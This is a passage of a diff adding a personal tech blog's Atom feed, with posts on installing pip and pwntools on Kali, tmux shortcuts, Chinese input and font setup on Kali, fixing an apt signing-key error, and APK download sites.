+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>client:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="kali-安装-pip"><a class="markdownIt-Anchor" href="#kali-安装-pip"></a> kali 安装 pip</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install python2-pip</span><br><span class="line">apt-get install python3-pip</span><br></pre></td></tr></table></figure>
+<p>安装ipython</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install ipython</span><br></pre></td></tr></table></figure>
+<h3 id="pwntools"><a class="markdownIt-Anchor" href="#pwntools"></a> pwntools</h3>
+<p>安装：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools</span><br><span class="line">apt-get install --upgrade capstone</span><br></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;xxd&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#xxd&quot;&gt;&lt;/a&gt; XXD&lt;/h3&gt;
+&lt;hr&gt;
+&lt;h3 id=&quot;objdump&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#objdump&quot;&gt;&lt;/a&gt; 
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
+    
+    
+      <category term="Linux" scheme="http://flamepeak.com/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>tmux 使用</title>
+    <link href="http://flamepeak.com/2019/10/21/tmux-usage-20191021/"/>
+    <id>http://flamepeak.com/2019/10/21/tmux-usage-20191021/</id>
+    <published>2019-10-21T01:33:00.000Z</published>
+    <updated>2019-10-29T00:40:42.018Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/liuguanglin/p/9290345.html" target="_blank" rel="noopener">参考</a></p>
+<h3 id="tmux基本结构"><a class="markdownIt-Anchor" href="#tmux基本结构"></a> tmux基本结构</h3>
+<p>tmux的结构包括会话(session)、窗口(window)、窗格(pane)三部分，会话实质是伪终端的集合，每个窗格表示一个伪终端，多个窗格展现在一个屏幕上，这一屏幕就叫窗口。</p>
+<h3 id="基本用法"><a class="markdownIt-Anchor" href="#基本用法"></a> 基本用法</h3>
+<p>tmux默认的快捷键前缀是Ctrl+b(下文用prefix指代)，按下前缀组合键后松开，再按下命令键进行快捷操作，比如使用prefix d分离会话（应该写作prefix d而不是prefix+d，因为d键不需要与prefix同时按下）。</p>
+<h3 id="快捷键"><a class="markdownIt-Anchor" href="#快捷键"></a> 快捷键</h3>
+<h4 id="会话管理"><a class="markdownIt-Anchor" href="#会话管理"></a> 会话管理</h4>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tmux new　　创建默认名称的会话（在tmux命令模式使用new命令可实现同样的功能，其他命令同理，后文不再列出tmux终端命令）</span><br><span class="line"></span><br><span class="line">tmux new -s mysession　　创建名为mysession的会话</span><br><span class="line"></span><br><span class="line">tmux ls　　显示会话列表</span><br><span class="line"></span><br><span class="line">tmux a　　连接上一个会话</span><br><span class="line"></span><br><span class="line">tmux a -t mysession　　连接指定会话</span><br><span class="line"></span><br><span class="line">tmux rename -t s1 s2　　重命名会话s1为s2</span><br><span class="line"></span><br><span class="line">tmux <span class="built_in">kill</span>-session　　关闭上次打开的会话</span><br><span class="line"></span><br><span class="line">tmux <span class="built_in">kill</span>-session -t s1　　关闭会话s1</span><br><span class="line"></span><br><span class="line">tmux <span class="built_in">kill</span>-session -a -t s1　　关闭除s1外的所有会话</span><br><span class="line"></span><br><span class="line">tmux <span class="built_in">kill</span>-server　　关闭所有会话</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">prefix s　　列出会话，可进行切换</span><br><span class="line"></span><br><span class="line">prefix $　　重命名会话</span><br><span class="line"></span><br><span class="line">prefix d　　分离当前会话</span><br><span class="line"></span><br><span class="line">prefix D　　分离指定会话</span><br></pre></td></tr></table></figure>
+<h4 id="窗口管理"><a class="markdownIt-Anchor" href="#窗口管理"></a> 窗口管理</h4>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">prefix c　　创建一个新窗口</span><br><span class="line"></span><br><span class="line">prefix ,　　重命名当前窗口</span><br><span class="line"></span><br><span class="line">prefix w　　列出所有窗口，可进行切换</span><br><span class="line"></span><br><span class="line">prefix n　　进入下一个窗口</span><br><span class="line"></span><br><span class="line">prefix p　　进入上一个窗口</span><br><span class="line"></span><br><span class="line">prefix l　　进入之前操作的窗口</span><br><span class="line"></span><br><span class="line">prefix 0~9　　选择编号0~9对应的窗口</span><br><span class="line"></span><br><span class="line">prefix .　　修改当前窗口索引编号</span><br><span class="line"></span><br><span class="line">prefix <span class="string">'　　切换至指定编号（可大于9）的窗口</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">prefix f　　根据显示的内容搜索窗格</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">prefix &amp;　　关闭当前窗口</span></span><br></pre></td></tr></table></figure>
+<h4 id="窗格管理"><a class="markdownIt-Anchor" href="#窗格管理"></a> 窗格管理</h4>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">prefix %　　垂直方向创建窗格</span><br><span class="line"></span><br><span class="line">prefix <span class="string">"　　水平方向创建窗格</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">prefix Up|Down|Left|Right　　根据箭头方向切换窗格</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">prefix q　　显示窗格编号</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">prefix o　　顺时针切换窗格</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">prefix &#125;　　与下一个窗格交换位置</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">prefix &#123;　　与上一个窗格交换位置</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">prefix x　　关闭当前窗格</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">prefix space(空格键)　　重新排列当前窗口下的所有窗格</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">prefix !　　将当前窗格置于新窗口</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">prefix Ctrl+o　　逆时针旋转当前窗口的窗格</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">prefix t　　在当前窗格显示时间</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">prefix z　　放大当前窗格(再次按下将还原)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">prefix i　　显示当前窗格信息</span></span><br></pre></td></tr></table></figure>
+<p></p>
+<h4 id="其他命令"><a class="markdownIt-Anchor" href="#其他命令"></a> 其他命令</h4>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tmux list-key　　列出所有绑定的键，等同于prefix ?</span><br><span class="line">tmux list-command　　列出所有命令</span><br></pre></td></tr></table></figure>
+<p>翻页scroll的使用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tmux中多窗口表示时，没有滚动条，可以使用下面的方法翻页查看信息</span><br><span class="line"></span><br><span class="line">绑定的快捷开始键 默认　ctrl ＋ｂ + [</span><br><span class="line">使用 PgUp PgDn 实现上下翻页</span><br><span class="line">键 q 退出</span><br></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/liuguanglin/p/9290345.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;参考&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;tmux基本结构&quot;&gt;&lt;a class=&quot;markdo
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
+    
+    
+      <category term="Linux" scheme="http://flamepeak.com/tags/Linux/"/>
+    
+      <category term="tmux" scheme="http://flamepeak.com/tags/tmux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Kali install google-pinyin input</title>
+    <link href="http://flamepeak.com/2019/10/19/Kali-install-sougou-20191019/"/>
+    <id>http://flamepeak.com/2019/10/19/Kali-install-sougou-20191019/</id>
+    <published>2019-10-19T08:21:49.000Z</published>
+    <updated>2019-12-02T03:21:46.759Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="kali-20193"><a class="markdownIt-Anchor" href="#kali-20193"></a> kali 2019.3</h2>
+<p><a href="http://www.programmersought.com/article/1738186330/" target="_blank" rel="noopener">Kali install Chinese Chinese input method (one success without error)</a></p>
+<ol>
+<li>
+<p>View your own kernel information, the kernel version is too low, the source you need</p>
+</li>
+<li>
+<p>Use the command <code>vim /etc/apt/sources.list</code> , configure Alibaba Cloud image source (only need one Ali cloud source)</p>
+</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#中科大 </span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib </span><br><span class="line">#阿里云</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib </span><br><span class="line">#东软大学</span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib </span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib </span><br><span class="line">#官方源 </span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>
+<p>Update with commands <code>apt-get update &amp;&amp; apt-get upgrade</code> Synchronize the index of the source, upgrade the package</p>
+</li>
+<li>
+<p>Use the command <code>apt-get install fcitx</code> Install input method framework</p>
+</li>
+<li>
+<p>Use the command <code>apt-get install fcitx-googlepinyin</code> Install Google Input Method</p>
+</li>
+<li>
+<p>Use the command <code>reboot</code> , restart the system</p>
+</li>
+<li>
+<p>Click on the menu</p>
+</li>
+<li>
+<p>Click ALL—Click on the little penguin <code>fcitx configuration</code> input method(ie input method framework)</p>
+</li>
+<li>
+<p>The default input method is EnglishUS (according to the system).Click <code>+</code></p>
+</li>
+<li>
+<p>Cancel check mark—Search Google</p>
+</li>
+<li>
+<p>Google Input MethodPlaced on the first input</p>
+</li>
+<li>
+<p>VerificationCtrl+Space Switch input method, Firefox browser test in kali is successful</p>
+</li>
+</ol>
+<h2 id="kali-20194"><a class="markdownIt-Anchor" href="#kali-20194"></a> kali 2019.4</h2>
+<h3 id="安装中文支持"><a class="markdownIt-Anchor" href="#安装中文支持"></a> 安装中文支持</h3>
+<p><a href="https://defcon.cn/110.html" target="_blank" rel="noopener">解决Kali Linux 2019.4中文乱码问题</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#中科大 </span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib </span><br><span class="line">#阿里云</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib </span><br><span class="line">#东软大学</span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib </span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib </span><br><span class="line">#官方源 </span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get clean</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br><span class="line">选中en_US.UTF-8 UTF-8和zh_CN.UTF-8 UTF-8（空格是选择，tab是切换，*是选中）</span><br></pre></td></tr></table></figure>
+<p>安装中文字体</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install xfonts-intl-chinese </span><br><span class="line">apt-get install ttf-wqy-microhei</span><br></pre></td></tr></table></figure>
+<p>在终端中使用<code>kali-undercover</code>可以在两个主题之间切换，一个win10既视感。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;kali-20193&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#kali-20193&quot;&gt;&lt;/a&gt; kali 2019.3&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;http://www.programmersought.com/articl
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
+    
+    
+      <category term="Linux" scheme="http://flamepeak.com/tags/Linux/"/>
+    
+      <category term="Kali" scheme="http://flamepeak.com/tags/Kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>kali apt-get update error resolve 20191016</title>
+    <link href="http://flamepeak.com/2019/10/16/apt-get-update-error-resolve-20191016/"/>
+    <id>http://flamepeak.com/2019/10/16/apt-get-update-error-resolve-20191016/</id>
+    <published>2019-10-16T08:21:49.000Z</published>
+    <updated>2019-10-16T08:27:32.705Z</updated>
+    
+    <content type="html"><![CDATA[<p>在更新kali系统时出现如下错误：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Kali:/usr/xiaocan# apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">N: Updating from such a repository can&apos;t be done securely, and is therefore disabled by default.</span><br><span class="line">N: See apt-secure(8) manpage for repository creation and user configuration details.</span><br></pre></td></tr></table></figure>
+<p>错误原因是，证书太旧了，需要升级</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add</span><br></pre></td></tr></table></figure>
+<p>下面是一些国内源：</p>
+<p>修改<code>/etc/apt/sources.list</code>可以添加</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line">#阿里云</span><br><span class="line">#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line">#清华大学</span><br><span class="line">#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"> </span><br><span class="line">#浙大</span><br><span class="line">#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在更新kali系统时出现如下错误：&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;root@Kali:/usr/xiaocan# apt-get
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
+    
+    
+      <category term="Linux" scheme="http://flamepeak.com/tags/Linux/"/>
+    
+      <category term="Kali" scheme="http://flamepeak.com/tags/Kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>APK downloader without google play store</title>
+    <link href="http://flamepeak.com/2019/10/12/APK-downloader-without-google-play-store-20191012/"/>
+    <id>http://flamepeak.com/2019/10/12/APK-downloader-without-google-play-store-20191012/</id>
+    <published>2019-10-12T00:14:28.000Z</published>
+    <updated>2019-12-09T00:36:15.925Z</updated>
+    
+    <content type="html"><![CDATA[<p>已经被墙的：</p>
+<p><a href="https://apkpure.com/" target="_blank" rel="noopener">APKpure</a></p>
+<p><a href="https://www.apkmirror.com/" target="_blank" rel="noopener">APKmirror</a></p>
+<p><a href="https://www.apkmonk.com/" target="_blank" rel="noopener">APKmonk</a></p>
+<p><a href="https://apps.evozi.com/apk-downloader/" target="_blank" rel="noopener">EVOZI</a></p>
+<p><a href="https://en.aptoide.com/" target="_blank" rel="noopener">Aptoide</a></p>
+<p><a href="https://apk-dl.com/" target="_blank" rel="noopener">APK-DL</a></p>
+<hr>
+<p>还可以用的：</p>
+<p><a href="https://apkcombo.com/en-ru/apk-downloader/" target="_blank" rel="noopener">APKCombo</a></p>
+<p><a href="https://apk.support/apk-downloader" target="_blank" rel="noopener">APK.Support</a>:网页可以访问，可以生成play.googleapis.com下载地址，但是google的下载地址无法访问</p>
+<p><a href="https://apkfab.com" target="_blank" rel="noopener">APKFab</a></p>
+<p><a href="https://mobile.softpedia.com/apk/" target="_blank" rel="noopener">SoftPedia APK</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;已经被墙的：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://apkpure.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;APKpure&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.apkmirror.com/&quot; targe
+    
+    </summary>
+    
+      <category term="Android" scheme="http://flamepeak.com/categories/Android/"/>
+    
+    
+      <category term="Tools" scheme="http://flamepeak.com/tags/Tools/"/>
+    
+  </entry>
+  
+</feed>
